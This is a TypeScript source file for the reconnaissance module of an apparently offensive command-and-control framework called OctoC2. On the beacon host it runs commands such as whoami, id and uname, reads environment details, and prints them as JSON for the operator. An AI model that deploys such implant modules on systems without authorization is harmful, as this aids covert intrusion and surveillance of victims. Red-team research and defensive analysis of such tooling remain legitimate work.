#!/usr/bin/env bun
/**
 * OctoC2 recon module — collect structured system information.
 *
 * Output: single JSON line on stdout.
 * Fields: beaconId, hostname, whoami, uid, gid, home, shell,
 *         uname, os, arch, pid, cwd, uptimeSeconds, collectedAt
 *
 * Compile:
 *   octoctl module build recon --beacon <id> --source ./modules/recon.ts \
 *     --server-url <url>
 */
import { execSync } from "node:child_process";

function run(cmd: string): string {
  try {
    return execSync(cmd, { encoding: "utf8", timeout: 5000 }).trim();
  } catch {
    return "(unavailable)";
  }
}

function uptimeSeconds(): number {
  try {
    if (process.platform === "linux") {
      const raw = execSync("cat /proc/uptime", { encoding: "utf8", timeout: 2000 });
      return Math.floor(parseFloat(raw.split(" ")[0]!));
    }
    if (process.platform === "darwin") {
      const raw = execSync("sysctl -n kern.boottime", { encoding: "utf8", timeout: 2000 });
      const m = raw.match(/sec\s*=\s*(\d+)/);
      if (m) return Math.floor(Date.now() / 1000 - parseInt(m[1]!, 10));
    }
  } catch { /* fall through */ }
  return -1;
}

const result = {
  beaconId:      process.env["OCTOC2_BEACON_ID"] ?? "unknown",
  hostname:      run("hostname"),
  whoami:        run("whoami"),
  uid:           process.platform === "win32" ? "(n/a)" : run("id -u"),
  gid:           process.platform === "win32" ? "(n/a)" : run("id -g"),
  home:          process.env["HOME"] ?? process.env["USERPROFILE"] ?? "(unknown)",
  shell:         process.env["SHELL"] ?? process.env["ComSpec"] ?? "(unknown)",
  uname:         run(process.platform === "win32" ? "ver" : "uname -a"),
  os:            process.platform,
  arch:          process.arch,
  pid:           process.pid,
  cwd:           process.cwd(),
  uptimeSeconds: uptimeSeconds(),
  collectedAt:   new Date().toISOString(),
};

process.stdout.write(JSON.stringify(result) + "\n");
